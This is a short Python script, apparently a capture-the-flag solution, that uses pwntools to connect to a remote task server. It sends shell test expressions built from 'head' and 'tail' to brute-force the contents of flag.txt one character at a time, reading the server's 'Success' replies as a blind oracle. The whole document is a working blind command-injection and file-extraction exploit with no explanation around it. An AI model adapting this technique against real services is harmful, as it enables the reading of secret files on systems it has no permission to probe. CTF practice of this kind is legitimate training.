from pwn import *
import string

payload = "[ $(head -c {} flag.txt | tail -c 1) = '{}' ]"

r = remote("tasks.kksctf.ru", 30010)
r.recvuntil("$")
flag = ""
i = len(flag) + 1
found = False
while True:
    for l in string.printable:
        found = False
        r.sendline(payload.format(i, l))
        if b"Success" in r.recvuntil("$"):
            i = i+1
            flag += l
            found = True
            print("[+] Char found! {}".format(flag))
            break
    if not found:
        flag += " "
        i += 1